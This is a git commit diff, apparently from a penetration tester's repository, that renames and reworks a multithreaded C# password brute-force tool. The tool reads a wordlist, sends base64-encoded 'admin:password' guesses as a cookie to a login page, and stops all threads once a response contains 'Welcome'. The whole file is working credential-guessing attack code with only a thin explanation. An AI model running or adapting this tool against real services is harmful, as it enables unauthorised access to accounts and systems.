e34e116fe64d7fc04514e4786264ee618b538477
Nouf <noufpentest@gmail.com>
2017-07-16 02:46:45 +0100

    Update and rename Program.cs to BruteForce.cs

--- BruteForce.cs
+++ BruteForce.cs
@@ -1,78 +1,54 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
-using System.Linq;
 using System.Text;
 using System.Threading;
-using System.Net.Http;
 using System.Net;
-using System.Collections.Specialized;
 using System.IO;
-
-
-/* TO DO:
- * 1- In method CheckPass send alter if correct pass founded
- * 2- In method Main Wait for threads alter
- */
-  
 namespace BruteForce
 {
-    class Program
+    class BruteForce
     {
         static List<string> passList = new List<string>();
         static string user = "admin";
-        static string password;
-        static int range;
-
+        static string password = "Didn't get the passowrd! :'(";
+        static EventWaitHandle handle = new AutoResetEvent(false);
+        static int id = 0;
         static void Main(string[] args)
         {
             string pass = "";
             int numThreads = 100;
             Thread[] threads = new Thread[numThreads];
-
             StreamReader file = new StreamReader("c:\\passList.txt");
             while ((pass = file.ReadLine()) != null)
                 passList.Add(pass);
             file.Close();
-
-            range = passList.Count / numThreads;
-
             for (int i= 0; i < numThreads; i++)
             {
-                ThreadStart start = new ThreadStart(() => CheckPass(i));
+                ThreadStart start = new ThreadStart(CheckPass);
                 threads[i] = new Thread(start);
                 threads[i].Start();
-
             }
-
-            //2- Wait for alter
-
+            handle.WaitOne();
             foreach (Thread thread in threads)
                 thread.Abort();
-
-
             Console.WriteLine("\n\nPassword is: " + password);
-
             Console.Read();
         }
-
-        public static void CheckPass(int pointer)
+        public static void CheckPass()
         {
-            int end = ((1 + pointer) * range > passList.Count) ? passList.Count : (1 + pointer) * range;
-
-            for(int i=pointer*range; i<end; i++)
+            for(; id < passList.Count; )
             {
-                string pass = passList[i];
+                string pass = passList[id];
+                id++;
                 string encoded = Connect(Convert.ToBase64String(Encoding.ASCII.GetBytes(user + ":" + pass)));
                 if (encoded.Contains("Welcome"))
                 {
                     password = pass;
-                    //1- send alter if correct pass founded and stop thread
-                    
+                    handle.Set();
                     break;
                 }
                 Console.WriteLine(pass);
             }
-
         }
         public static string Connect(string cookieValue)
         {
@@ -84,7 +60,6 @@ namespace BruteForce
             HttpWebResponse response = request.GetResponse() as HttpWebResponse;
             var encoding = ASCIIEncoding.ASCII;
             StreamReader reader = new StreamReader(response.GetResponseStream());
-
             return reader.ReadToEnd();
         }
     }
